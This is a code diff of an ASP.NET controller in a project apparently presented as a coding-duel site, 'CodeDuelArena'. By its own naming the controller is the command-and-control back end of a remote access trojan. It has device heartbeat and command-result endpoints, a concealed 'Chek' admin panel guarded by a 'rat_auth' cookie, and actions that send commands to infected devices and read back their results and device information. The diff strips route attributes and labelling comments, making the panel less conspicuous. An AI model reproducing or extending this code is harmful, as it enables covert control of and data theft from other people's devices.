@@ -2,7 +2,6 @@ using Microsoft.AspNetCore.Mvc;
 using Microsoft.EntityFrameworkCore;
 using System.Collections.Concurrent;
 using CodeDuelArena.Data;
-using CodeDuelArena.Models;
 
 namespace CodeDuelArena.Controllers
 {
@@ -19,10 +18,7 @@ namespace CodeDuelArena.Controllers
             _db = db;
         }
         
-        // ============ API ДЛЯ ПРИЛОЖЕНИЯ ============
-        
         [HttpPost]
-        [Route("api/rat/heartbeat")]
         public IActionResult Heartbeat([FromBody] DeviceData data)
         {
             if (data == null) return BadRequest();
@@ -36,7 +32,6 @@ namespace CodeDuelArena.Controllers
         }
         
         [HttpPost]
-        [Route("api/rat/result")]
         public IActionResult CommandResult([FromBody] CommandResult result)
         {
             if (result == null) return BadRequest();
@@ -44,14 +39,10 @@ namespace CodeDuelArena.Controllers
             return Ok();
         }
         
-        // ============ АДМИН-ПАНЕЛЬ ============
-        
         [HttpGet]
-        [Route("Chek/Chek/Login")]
         public IActionResult Login() => View();
         
         [HttpPost]
-        [Route("Chek/Chek/Login")]
         public IActionResult Login(string password)
         {
             if (password == RatPassword)
@@ -68,7 +59,6 @@ namespace CodeDuelArena.Controllers
         }
         
         [HttpGet]
-        [Route("Chek/Dashboard")]
         public IActionResult Dashboard()
         {
             if (Request.Cookies["rat_auth"] != "true")
@@ -77,7 +67,6 @@ namespace CodeDuelArena.Controllers
         }
         
         [HttpPost]
-        [Route("Chek/SendCommand")]
         public IActionResult SendCommand(string deviceId, string command)
         {
             if (Request.Cookies["rat_auth"] != "true")
@@ -89,7 +78,6 @@ namespace CodeDuelArena.Controllers
         }
         
         [HttpGet]
-        [Route("Chek/GetResult")]
         public IActionResult GetResult(string commandId)
         {
             if (_commandResults.TryRemove(commandId, out var result))
@@ -99,7 +87,6 @@ namespace CodeDuelArena.Controllers
         }
         
         [HttpGet]
-        [Route("Chek/DeviceInfo")]
         public IActionResult DeviceInfo(string deviceId)
         {
             if (_devices.TryGetValue(deviceId, out var device))
